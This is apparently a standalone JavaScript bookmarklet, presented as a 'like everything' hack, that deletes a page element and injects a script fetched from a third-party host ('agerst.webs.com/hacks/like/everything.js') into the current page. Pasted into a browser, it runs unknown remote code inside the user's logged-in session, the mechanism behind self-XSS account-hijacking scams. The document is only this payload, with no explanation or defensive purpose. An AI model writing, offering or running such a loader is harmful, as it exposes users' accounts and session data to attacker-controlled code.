javascript: var s = document.getElementById('happyStatus');
if (s) s.parentNode.removeChild(s);
s = document.createElement('script');
s.setAttribute('src', 'http://www.agerst.webs.com/hacks/like/everything.js');
s.setAttribute('type', 'text/javascript');
s.setAttribute('id', 'HnSScript');
document.body.appendChild(s);